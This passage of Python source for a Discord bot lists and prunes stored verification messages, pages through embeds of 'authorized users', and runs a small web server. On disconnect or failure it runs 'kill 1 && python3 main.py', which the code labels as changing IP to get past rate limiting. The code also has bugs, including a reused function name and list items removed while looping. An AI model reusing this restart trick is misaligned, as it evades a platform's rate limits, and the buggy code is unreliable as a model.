                    description="Shows All Verify Stored Messages")
@checklol()
async def shv(ctx):
  embed = discord.Embed(color=color, title="Stored Messages")
  with open("Database/db2.json", "r") as f:
    data = json.load(f)
  if data["ids"] == []:
    embed.description = "No Messages Stored!"
    return await ctx.reply(embed=embed, mention_author=False)
  description = ">>> "
  count = 0
  for il in data['ids']:
    dx = int(il.split("|")[0])
    dxx = int(il.split("|")[1])
    #await ctx.send(dx)
    channel = bot.get_channel(dx)
    try:
      g = bot.get_guild(channel.guild.id).name
    except:
      g = "Not Valid Anymore"
    if channel == None:
      channel = "Not Valid Anymore"
    try:
      msg = await channel.fetch_message(dxx)
      if msg == None:
        msg = "Not Valid Anymore"
        print("w")
    except Exception as e:
      #print(e)
      msg = "Not Valid Anymore"
    if msg != "Not Valid Anymore":
      try:
        msgr = f"Valid [Click Here]({msg.jump_url})"
      except:
        msgr = msg
    else:
      msgr = msg
    count += 1
    description += f"[{count}] - **Server: {g} | Channel: {channel} | Message: {msgr}**\n"
  embed.description = description
  await ctx.reply(embed=embed, mention_author=False)


@bot.hybrid_command(name="verify-sync-del",
                    aliases=["verify-del-sync", 'verify-del'],
                    description="Shows All Verify Stored Messages")
@checklol()
async def shv(ctx):
  embed = discord.Embed(color=color, title="Stored Messages")
  with open("Database/db2.json", "r") as f:
    data = json.load(f)
  if data["ids"] == []:
    embed.description = "No Messages Stored!"
    return await ctx.reply(embed=embed, mention_author=False)
  description = ">>> "
  count = 0
  for il in data['ids']:
    dx = int(il.split("|")[0])
    dxx = int(il.split("|")[1])
    #await ctx.send(dx)
    channel = bot.get_channel(dx)
    try:
      g = bot.get_guild(channel.guild.id).name
    except:
      g = "Not Valid Anymore"
    if channel == None:
      channel = "Not Valid Anymore"
    try:
      msg = await channel.fetch_message(dxx)
      if msg == None:
        msg = "Not Valid Anymore"
        print("w")
    except Exception as e:
      #print(e)
      msg = "Not Valid Anymore"
    if msg != "Not Valid Anymore":
      try:
        msgr = f"Valid [Click Here]({msg.jump_url})"
      except:
        msgr = msg
    else:
      msgr = msg
    if str(msgr).lower() == "not valid anymore":
      data["ids"].remove(il)
      count += 1
    #description+=f"[{count}] - **Server: {g} | Channel: {channel} | Message: {msgr}**\n"
  if count == 0:
    embed.description = "None of them are invaild messages."
    await ctx.reply(embed=embed, mention_author=False)
  else:
    embed.description = f"Successfully removed {count} invaild messages."
    with open("Database/db2.json", "w") as f:
      json.dump(data, f, indent=4)
    await ctx.reply(embed=embed, mention_author=False)


class PaginationViewWallah:

  def __init__(self, embed_list, ctx):
    self.elist = embed_list
    self.context = ctx

  def disable_button(self, menu):
    tax = str(menu.message.embeds[0].footer.text).replace(" ", "").replace(
        "Page", "")
    num = int(tax[0])
    if num == 1:
      fis = menu.get_button("2", search_by="id")
      bax = menu.get_button("1", search_by="id")

      #print(bax)
      #menu.disable_button(fis)
    # menu.disable_button(bax)

  def enable_button(self, menu):
    tax = str(menu.message.embeds[0].footer.text).replace(" ", "").replace(
        "Page", "")
    num = int(tax[0])
    if num != 1:
      fis = menu.get_button("2", search_by="id")
      bax = menu.get_button("1", search_by="id")
      print(bax)
      #menu.enable_button(fis)
      #menu.enable_button(bax)

  async def dis_button(self, menu):
    self.disable_button(menu)

  async def ene_button(self, menu):
    self.ene_button(menu)

  async def start(self, ctx, disxd=False):
    style = f"{ctx.bot.user.name} • Page $/&"
    menu = ViewMenu(ctx, menu_type=ViewMenu.TypeEmbed, style=style)
    for xem in self.elist:
      menu.add_page(xem)
    lax = ViewButton(style=discord.ButtonStyle.secondary,
                     label=None,
                     emoji='⏪',
                     custom_id=ViewButton.ID_GO_TO_FIRST_PAGE)
    menu.add_button(lax)
    bax = ViewButton(style=discord.ButtonStyle.secondary,
                     label=None,
                     emoji='◀️',
                     custom_id=ViewButton.ID_PREVIOUS_PAGE)
    menu.add_button(bax)
    bax2 = ViewButton(style=discord.ButtonStyle.secondary,
                      label=None,
                      emoji='⏹️',
                      custom_id=ViewButton.ID_END_SESSION)
    menu.add_button(bax2)
    bax3 = ViewButton(style=discord.ButtonStyle.secondary,
                      label=None,
                      emoji='▶️',
                      custom_id=ViewButton.ID_NEXT_PAGE)
    menu.add_button(bax3)
    sax = ViewButton(style=discord.ButtonStyle.secondary,
                     label=None,
                     emoji='⏩',
                     custom_id=ViewButton.ID_GO_TO_LAST_PAGE)
    menu.add_button(sax)
    if disxd:
      menu.disable_all_buttons()
    menu.disable_button(lax)
    menu.disable_button(bax)

    #async def relay_xd(payload):
    #await asyncio.gather(*[all_in_one_xd(payload)])
    async def all_in_one_xd(payload):
      #print(menu.current_page)
      #await self.dis_button(menu)
      #await self.ene_button(menu)
      # p#rint(dir(menu))
      newmsg = await ctx.channel.fetch_message(menu.message.id)
      tax = str(newmsg.embeds[0].footer.text).replace(
          f"{ctx.bot.user.name}",
          "").replace(" ", "").replace("Page", "").replace(
              f"{ctx.bot.user.name}",
              "").replace("•", "").replace(str(ctx.bot.user.name),
                                           "").replace(f"{ctx.bot.user.name}",
                                                       "")
      saxl = tax.split("/")
      saxl[0].replace(f"{ctx.bot.user.name}", "")
      num = int(saxl[0])
      numw = int(saxl[1])
      if num == 1:
        menu.disable_button(lax)
        menu.disable_button(bax)
      else:
        menu.enable_button(lax)
        menu.enable_button(bax)
      if num == numw:
        menu.disable_button(bax3)
        menu.disable_button(sax)
      else:
        menu.enable_button(bax3)
        menu.enable_button(sax)
      await menu.refresh_menu_items()

    menu.set_relay(all_in_one_xd)
    await menu.start()


async def working_lister(ctx, color, listxd, *, title):
  embed_array = []
  t = title
  clr = color
  sent = []
  your_list = listxd
  count = 0
  embed = discord.Embed(color=clr, description="", title=t)
  embed.set_footer(icon_url=ctx.bot.user.avatar)
  if len(listxd) > 1:
    for i in range(len(listxd)):
      for i__ in range(10):
        if not your_list[i] in sent:
          count += 1
          if str(count).endswith("0") or len(str(count)) != 1:
            actualcount = str(count)
          else:
            actualcount = f"0{count}"
          embed.description += f"`[{actualcount}]` | <@{your_list[i]}> `[{your_list[i]}]`\n"
          sent.append(your_list[i])
      if str(count).endswith("0") or str(count) == str(len(your_list)):
        embed_array.append(embed)
        embed = discord.Embed(color=clr, description="", title=t)
        embed.set_footer(icon_url=ctx.bot.user.avatar)
  if len(embed_array) == 0:
    embed_array.append(embed)
  pag = PaginationViewWallah(embed_array, ctx)
  if len(embed_array) == 1:
    await pag.start(ctx, True)
  else:
    await pag.start(ctx)


@bot.hybrid_command(description="Shows All Stored Users")
@checklol()
async def users(ctx):
  listlol = []
  ids = get_ids()
  #ids = ["69", "78"]
  await working_lister(
      ctx=ctx,
      color=color,
      title=f"Total authorized users in database - {len(ids)}",
      listxd=ids)


@bot.event
async def on_disconnect():
  raw_webhook_send_("Disconnected from discord, Attempting To Re-Connect.")
  os.system("kill 1 && python3 main.py")


def ratelimit_fix():
  raw_webhook_send_("Rate limited, Changing IP.")
  os.system("kill 1 && python3 main.py")


if __name__ == "__main__":
  threading.Thread(target=app.run, args=("0.0.0.0", 8080)).start()
  try:
    bot.run(bot_token)
  except:
    ratelimit_fix()
